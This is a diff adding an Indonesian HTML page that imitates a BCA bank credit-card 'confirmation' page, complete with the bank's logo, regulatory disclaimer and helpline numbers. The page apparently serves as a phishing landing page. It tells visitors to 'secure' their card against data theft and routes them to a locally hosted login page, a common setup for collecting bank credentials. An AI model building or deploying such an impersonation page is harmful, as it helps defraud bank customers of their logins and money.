@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pengajuan Kartu Kredit BCA</title>
+    <style>
+/* Gaya Dasar */
+body {
+    /* Ganti font-family: 'Arial', 'Helvetica Neue', Helvetica, sans-serif; */
+    /* MENJADI: */
+    font-family: 'Calibri', Candara, Segoe, "Segoe UI", Optima, Arial, sans-serif; 
+    margin: 0;
+    padding: 0;
+    background-color: #f4f6f8;
+    color: #333;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+/* Anda juga dapat menghapus properti font-family dari .title dan .subtitle 
+   karena properti tersebut akan diwariskan dari body */
+
+    /* Header BCA */
+.header-bca {
+    width: 100%;
+    background-color: white;
+    padding: 15px 0; /* Padding vertikal */
+    text-align: left;
+    border-bottom: 1px solid #ddd;
+    /* Tambahkan bayangan jika diperlukan, meskipun pada gambar Anda tidak terlihat jelas */
+    /* box-shadow: 0 2px 4px rgba(0,0,0,0.05); */
+}
+
+.header-bca img {
+    height: 35px; /* Sedikit lebih besar dari 30px untuk tampilan yang lebih menonjol */
+    margin-left: 50px; /* Jarak dari sisi kiri halaman */
+    display: block; /* Agar img tidak meninggalkan spasi tambahan */
+}
+    /* Kontainer Utama */
+.container {
+    background-color: white;
+    padding: 60px; /* Nilai padding ditingkatkan untuk kotak yang lebih besar */
+    margin: 50px 20px 20px 20px;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    max-width: 700px; /* Lebar maksimum ditingkatkan */
+    width: 90%;
+    text-align: center;
+}
+
+/* Judul */
+.title {
+    color: #004d99;
+    font-size: 22px; /* Ukuran font sedikit dikecilkan */
+    font-weight: bold;
+    margin-bottom: 8px; /* Jarak bawah sedikit dikecilkan */
+}
+
+/* Subtitle */
+.subtitle {
+    font-size: 14px; /* Ukuran font dikecilkan */
+    color: #666;
+    margin-bottom: 25px; /* Jarak bawah sedikit dikecilkan */
+}
+
+    /* Bagian Tombol Opsi */
+    .options {
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+        margin-bottom: 30px; /* Jarak antara opsi dan teks "Lanjutkan / periksa" */
+    }
+
+    .option-box {
+        text-align: center;
+        text-decoration: none;
+        color: inherit;
+        flex: 1;
+        max-width: 250px; /* Lebar maksimum opsi */
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+    
+    /* GAYA UNTUK IKON DI ATAS TOMBOL */
+    .top-icon {
+        height: 100px; /* Atur tinggi kontainer ikon */
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-bottom: 10px; /* Jarak antara ikon dan tombol */
+    }
+
+    .top-icon img {
+        max-width: 100%;
+        max-height: 100%;
+        object-fit: contain;
+        display: block;
+    }
+
+    /* GAYA UNTUK TOMBOL BIRU MUDA (Teks Opsi) */
+    .button-text-container {
+        /* Warna dan Bentuk Tombol Melengkung */
+        background-color: #00aaff; /* Biru Muda */
+        color: white;
+        padding: 10px 20px;
+        border-radius: 20px; /* Membuat ujung melengkung seperti pil */
+        font-size: 16px;
+        font-weight: bold;
+        width: 100%; /* Memastikan tombol memanjang penuh dalam option-box */
+        box-sizing: border-box;
+        transition: background-color 0.3s;
+    }
+
+    .option-box:hover .button-text-container {
+        background-color: #0088cc;
+    }
+
+    /* Teks Periksa Status */
+    .status-check {
+        font-size: 16px;
+        color: #333;
+        margin-bottom: 15px; /* Jarak antara teks dan tombol Login */
+        margin-top: 0;
+    }
+
+    /* Tombol Login (Sudah Melengkung) */
+    .login-button {
+        background-color: #004d99;
+        color: white;
+        border: none;
+        padding: 12px 60px;
+        border-radius: 20px; /* Membuat ujung melengkung seperti pil */
+        font-size: 16px;
+        cursor: pointer;
+        text-decoration: none;
+        display: inline-block;
+        font-weight: bold;
+        transition: background-color 0.3s;
+    }
+
+    .login-button:hover {
+        background-color: #003a66;
+    }
+
+    /* Footer Info */
+    .info-link {
+        margin-top: 30px;
+        font-size: 14px;
+    }
+
+    .info-link a {
+        color: #004d99;
+        text-decoration: none;
+    }
+
+    /* Disclaimer */
+    .disclaimer {
+        padding: 10px 20px;
+        font-size: 12px;
+        color: #666;
+        text-align: center;
+        margin-top: 20px;
+        margin-bottom: 0;
+    }
+
+    /* Footer Biru (Sudah Naik) */
+    .footer-bca {
+        width: 100%;
+        background-color: #004d99;
+        color: white;
+        padding: 10px 0;
+        text-align: center;
+        font-size: 12px;
+    }
+
+        .disclaimer {
+            padding: 10px 20px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="header-bca">
+        <img src="logo (1).png" alt="Logo BCA">
+    </div>
+
+    <div class="container">
+        <div class="title">SELAMAT DATANG DI KONFIRMASI</div>
+        <div class="title" style="margin-bottom: 0;">KARTU KREDIT BCA</div>
+        <div class="subtitle">
+            Yuk, Amankan Kartu Kredit BCA <br>
+            agar terhindar dari pencurian data
+        </div>
+
+        <div class="options">
+    <a href="https://play.google.com/store/apps/details?id=com.bca" target="_blank" class="option-box">
+        <div class="top-icon">
+            <img src="icons-1.svg" alt="Aplikasi Online Icon">
+        </div>
+        <div class="button-text-container">
+            Aplikasi Online
+        </div>
+    </a>
+
+    <a href="https://wa.me/628111500998?text=Halo%20BCA%2C%20saya%20ingin%20bertanya%20tentang%20pengajuan%20kartu%20kredit." target="_blank" class="option-box">
+        <div class="top-icon">
+            <img src="icons-2.svg" alt="Personal Assistance Icon">
+        </div>
+        <div class="button-text-container">
+            Personal Assistance
+        </div>
+    </a>
+</div>
+
+<p class="status-check">Lanjutkan / periksa status aplikasi?</p>
+<a href="login_status.html" class="login-button">Login</a>
+
+        <div class="info-link">
+            Info lebih lanjut, hubungi Halo BCA <a href="tel:1500888">1500888</a>
+        </div>
+    </div>
+
+    <div class="disclaimer">
+        BCA berizin dan diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia.<br>
+        BCA merupakan peserta penjaminan LPS. Maksimum nilai simpanan yang dijamin LPS per Nasabah per Bank adalah Rp2 miliar. Untuk Cek Tingkat Bunga Penjaminan LPS, klik di sini.
+    </div>
+
+    <div class="footer-bca">
+        </div>
+</body>
+</html>
